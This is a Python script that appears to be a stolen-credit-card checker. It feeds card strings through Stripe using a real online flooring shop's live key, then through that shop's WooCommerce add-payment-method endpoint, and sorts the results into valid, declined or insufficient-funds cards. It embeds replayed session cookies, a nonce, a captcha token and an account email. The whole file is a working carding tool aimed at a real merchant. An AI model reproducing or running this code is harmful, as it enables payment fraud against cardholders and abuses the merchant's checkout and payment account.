import requests,re
import random
def StTele(ccx):
	import requests
	ccx=ccx.strip()
	cc = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	headers = {
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'priority': 'u=1, i',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
	}
	
	data = f'guid=372e4321-6362-4486-b068-bece0413829c3d404a&muid=26b6361f-e636-404c-a48b-f5a823fe8f1c166521&sid=957b3f3c-1c91-4b27-b069-bced7deceeaba28f86&referrer=https%3A%2F%2Fthefloordepot.com.au&type=card&owner[name]=+&owner[email]=hfezg93%40gmail.com&card[number]={cc}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fb792108426%3B+stripe-js-v3%2Fb792108426%3B+split-card-element&time_on_page=25567&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiSGJjZXQ4QmRLditxc1dhRXNKWlprU2xsNFZxYVJNQU5vanY4ZDgrUm00MERvY0xRRjdUTUhBOFVOWFN6bHBpUDYvSU9SYVM1em9ZU01UNWtxNVo2aUErQWpIUFBZN1pvK2tra3Y2L3N3OGEvdEVYQ3BqT0NqdzNkUEE3dU5MOENmdlNuSEpUdTZaRmFaQ1dRT0wwZWl1bXd3aUovTTZyNFVNc2pMc1hKVXZrNnFhdFZHWFd0NGtWMlRuVmZRWXpqOWZhMWtKa0t1TUdlT1NTN0JRaUtJNWZkU0I5ZXZPQm5jNkRGQTNOd0t3MHlmYjY1S2xKZ0k2RUpPVEV3Z1QyWldGYytIT1d0b2ZIN3ZoSVZQbkJucHh4eUdOZ0JHaHRtK3gyTGtwWWQwWldENk5rZCtpL21EUzlVc21BWXN2UU5vdmZ0UEluaHIvcFhuRitkam1jSm5vTU4vblZaWlozVDFKWUY0aDhTdktMUndMUVQrTm41b0puWWd4NmJRL2w2RDR2bTN5MVAwbHFkaDUrNHJveWxYd2NPS1VSajN6SDJta3dBbVgwNVcwUjdTdkkzTGhlWXZ1MW5VTVBOK2IrK0pjbjVpQ0Iyb3JQNWdDZTlvSm83bGx6dnR2K1RXdTdDeTR6SUptYTAzcGJza0RkdFVXQnFDU1AwVm04SmM2anFoNjIvUVA5ektPWEptT2FqclRZcTJsMnpWZk5wZldTZFVQVjZmaDFjeE1UOW42ellyRnU3RDVpdFM1VGZSaVVYeTdweVFSMXkraFowZkFlT2k4YkZSZ0FNZFdpL3dlamdGbFU0QTBMcTVyNmZMMFNySitBeEo3UHlxdFZZWDUwaUo2bS9OQWg1OWtuZTdsdVMvakZxem5pV3FUZ3hSVnR3Q3ZTaEdiNGs1UVk0aW42RjFIN3NTUGFSSjhSTXpQblNmWUhSa1hGcG5NQWQyVGJzQm5JMHI3SVNydmx4ZzlPTU9rcUJ1VW5JUXJETGtrajFFRHpYbkwzMXhSTndIZFpNSkxnemZLUXV4YzZMZnVxRGZtVyt1SEI0U0hZK2dYRlhVWXRpVTFvZWZ1NVA5NFR4WVRRd0NiU25ycmVVMTlWN1BWM3V3eWF1eTVvZjdLOGpMTTFJbkFXbEdlUW1IT0R6ZUhRenphYkd2ZGVDWDh2ZTNQTW5aR3dVcHdIZmd5dWtOanZVTldIM29mbjJiZWk1TFB5dzk4V2diVDNUWWZnWGZlOXRBUldWNHo4M3ZpOTF2T3FxbHJwT0hYQzM1a0YzRDg1TldhWmVoMFl1NVRvV1FaOTJ3MkZHT1graTNoMW50aW9OTU8vTy9vMVZpWEpZVXFGMzlZd0h1aDArbmc0cW5wRlRMRU9WTW04N3RHWWlqNnpWL241M0N2MW5CZkVxN20yTFNFNlI3NVFmRERFY2w5dHoxa1R2OGJtOEZUTGdlK21Bblc5L0tSaGUvQmhMRGh6d3lXUUJBU2JvZTZYWXRjNDdLcENZb1E3Wis5UDRSNWxPRTgxaGx0SFR5S0docE0zUHVZQkdWWFpmdjJSb0lzZkFGQVB5ejVYTFpXdHhkcTVxRHNSNkpZMTBMRzM5bWZPWloySHphSVRjV2xrRm9BT1J2VmRkamttL2N2K3h6TVcwNHFCOElLSVNqdHJSemdPR2hWYmN4di93YWtEeWxPUDNTYnhqZGxHZSsvYlFyOEsxZitoUHMwWGVadzBhTzZKaUQxZ2RMWTBoRWtZMmw4eXgxcTJSRENXTldmTk1KbW5mQVlHTWg2NWlIbllZaWpheUpBN3lPVEwvd3NnL21VcmMwaE9ydXpRZkZWWUlYMWFvSE05c3pyL0xzTU9QeU9wNjhIa21VcVluL1JWUjJaRnRxQlhTSmtyb2p2cXFZdklMNkFCWWJlUkozZENZSm4yVDdVWFBWMXJLQzN2SW9wakZvamVIQWNhbVdQUUIzTUdFWVlHVTVqQlBhczJZcVVIaVlIVG12c3pGMzEwRHNEaUdiMVVrK0M5TmFmaGdMZ3dSZlBORDdycXlxTkFaRzlhTkxLTVh3R01XdmJDbnpPUkNxU24zT3VJVGxCTzZnYXJ4SkxOeXV6dTlCcVJQLzBpd3AxeC9mN01URmYvaGQ4OWRINGNWWDV5KzNQcnhuSHAzeWc0SVE3OEREeTZla2hyWlZkZ3pIUTc3eWR5OWNkMVRoQXFOTFEvSS9Lcks3SXhWanJwWUkrVjV1VHo5UUMxLzBVTVR5Q3E2WHRXVlptUTJqU2tnWm50NTc0TWdkbDJXU0xmZUFZN0orR0RWN1RReStnd2dJZzloVEh3a0l4aFNlNkIxbVRpdWhzUEpjNk9TbUkrd3FmWmRkZE9QWlduYXh1MWFUMC9ZMXpNNEVSMGVOblFTUnNhbDM1ZUZDQW9kMmhBREpHU1hRMUVjdFl1NHFQeFlYUmxwTUg5ajNiSHE1MmVsbmlhZWpMdW53WXlJMUo4SWFUUVh0Q3pJM1ByR2xmQWJjKzlhaDFCWlRoSmZGR2Fhd2Z0dHAwaFYrU1hsZWdnOXhqM2xEZklMOEtLdmRPN0x0RFc4ZWpVWG1tVitnbnYrV0RZZFNXL3JrK0JST2xoN3hhY2RLT1ErSC9GWW8wM2VramVuMWhmMFNwM2ZqV2F0WC9EMDY2Y205Y3o0Si9yQm80THRLeHZrNVFwa2c5UXYyaWxOQ2RiazltU2ljSXpMT1htM1FqZlZjZ3htSW8wcFFLcVk1aG52WDhmV1RyeC9IQi9CWXJyZG1zcEYxcnliaXVOM3hhMldNTkQ5dWN5K2RRRFp5TzdaVGN2Y0dxSkVCYjRNbFFLNmsrenNUSXR2Y2JWVGZCa1VGbnU4MWN6QURwVFNKWCtaaXpFc2I0cE9ueVpJVERrS1o5Yk5xVDNTVFdIRXVOWXBrQ1NUOGNzR3dsaUY0eWVWdEZ1amY5RFg0ZlQrclFnRW1zVE9GY3ZuZFVpblFZVUJFdXZMTW1ITlpjV3A4S3R0N0pkcXNzd0NzOTlrSk9mY0RlZVRYMkhsTnFRRWhvc0hVUHAxWEs5dmV5TWhYTGpLa2hFck5yRTdSSzJpeGZZYXhsSFVOTXFiN3ZRTzIxOGRETi9rYzRKVWNLMnJIK3F1T3JyVGpXYUJ1VnludHRDRk45MTJ0RWlGVUZ2dDBHc1FsSGZudk5EMllDd1VQZ1U9IiwiZXhwIjoxNzI5NzYzMjgzLCJzaGFyZF9pZCI6NTM1NzY1NTksImtyIjoiMWQwNjQ0ZWUiLCJwZCI6MCwiY2RhdGEiOiJtdEFIamk3RW8vcEtrMmVaRE9ZUFc1cHU5N3B5aCtjRi85UVNBVWF6MlVoeWdiM1RNME83UUZnU2F3MmR3bTV3UFY2bkhqalJXbjdoNGh1Z2lNRGg0bitqay9TNmVtWEhrZEFKbUd3MWJCeVBNOWh3S3VIVlc5U01Hb0F2dGFCVFVxRE9qRHZYbDBpVVR2Nnk0Ti92R3AzcFhTaHNBSVh2YWZWWklrcGQwOFdzamxaa0FCTFBtVmVsWHpxK2JXSHhoeDVFRjNtdnBSNlZ4amgwIn0.UYQtjmcNU-G9AN_Mue6-Tp-1YFoN-3s1H6S6x_I1mbw&key=pk_live_51Hu8AnJt97umck43lG2FZIoccDHjdEFJ6EAa2V5KAZRsJXbZA7CznDILpkCL2BB753qW7yGzeFKaN77HBUkHmOKD00X2rm0Tkq'
	
	response = requests.post('https://api.stripe.com/v1/sources', headers=headers, data=data)
	try:
		id= (response.json()['id'])
	except Exception as e:
		if "Your card has insufficient funds." in response:
			print(F+f'[ {start_num} ]',P,' ➜ ',response)
		elif "Your card's security code is invalid." in response:
			print(F+f'[ {start_num} ]',P,' ➜ ',response)
		elif "Your card does not support this type of purchase." in response:
			print(F+f'[ {start_num} ]',P,' ➜ ',response)
		elif "Your card's expiration month is invalid." in response:
			print(F+f'[ {start_num} ]',P,' ➜ ',response)
		else:
			print('f')
		return
	cookies = {
	    '_gid': 'GA1.3.1917692095.1729763123',
	    '_gat_gtag_UA_161936636_1': '1',
	    '_gat_UA-140678297-20': '1',
	    '__stripe_mid': '26b6361f-e636-404c-a48b-f5a823fe8f1c166521',
	    '__stripe_sid': '957b3f3c-1c91-4b27-b069-bced7deceeaba28f86',
	    'wordpress_logged_in_1ba1531fe2aa9d347b344cf91649a893': 'hfezg93%7C1730972752%7CsblD9FNHkyum31cfJ4Kp4umVOrdLxH7EOsG2n9pnrUo%7C8e1b57226d37bf4d963e3f1115b64fc4a7732c3e72f419ce4832f2cc1743f6a6',
	    'wp_woocommerce_session_1ba1531fe2aa9d347b344cf91649a893': '60582%7C%7C1729935918%7C%7C1729932318%7C%7C80d2499bd3c149537df58d80e7b45685',
	    '_ga_4LZ986LPTT': 'GS1.1.1729763123.1.1.1729763154.0.0.0',
	    '_ga_E584PRZ969': 'GS1.1.1729763123.1.1.1729763154.0.0.0',
	    '_ga': 'GA1.3.1781985333.1729763123',
	}
	
	headers = {
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_gid=GA1.3.1917692095.1729763123; _gat_gtag_UA_161936636_1=1; _gat_UA-140678297-20=1; __stripe_mid=26b6361f-e636-404c-a48b-f5a823fe8f1c166521; __stripe_sid=957b3f3c-1c91-4b27-b069-bced7deceeaba28f86; wordpress_logged_in_1ba1531fe2aa9d347b344cf91649a893=hfezg93%7C1730972752%7CsblD9FNHkyum31cfJ4Kp4umVOrdLxH7EOsG2n9pnrUo%7C8e1b57226d37bf4d963e3f1115b64fc4a7732c3e72f419ce4832f2cc1743f6a6; wp_woocommerce_session_1ba1531fe2aa9d347b344cf91649a893=60582%7C%7C1729935918%7C%7C1729932318%7C%7C80d2499bd3c149537df58d80e7b45685; _ga_4LZ986LPTT=GS1.1.1729763123.1.1.1729763154.0.0.0; _ga_E584PRZ969=GS1.1.1729763123.1.1.1729763154.0.0.0; _ga=GA1.3.1781985333.1729763123',
	    'origin': 'https://thefloordepot.com.au',
	    'priority': 'u=1, i',
	    'referer': 'https://thefloordepot.com.au/my-account/add-payment-method/',
	    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_setup_intent',
	}
	
	data = {
	    'stripe_source_id': id,
	    'nonce': 'dc26db958c',
	}
	
	req0 = requests.post('https://thefloordepot.com.au/', params=params, cookies=cookies, headers=headers, data=data)
	if "success" in req0.text:
		return "success"
	elif "generic_decline" in req0.text:
		code = req0.json()['error']['message']
		msg = req0.json()['error']['message']
		return str(code+":"+msg)
	elif "Your card was declined." in req0.text:
		return "Your card was declined."	
	if "Your card does not support this type of purchase." in req0.text:
		return "Your card does not support this type of purchase."	
	elif "Your card has insufficient funds." in req0.text:	
		return "Your card has insufficient funds."
	if "Your card's security code is incorrect." in req0.text:
		return "Your card's security code is incorrect."
	if "Your card was declined for making repeated attempts too frequemtly or exceeding its amount limit." in req0.text:
		return "Withdrawal limit exceeded"
	if "Your card number is incorrect." in req0.text:
		return "Your card number is incorrect."
	if "Invaild account." in req0.text:
		return "Invaild account."
	else:
		try:
			code = req0.json()['error']['message']
			return code
		except:
			try:
				return req0.json()['error']['message']
			except:
				return req0.text
	 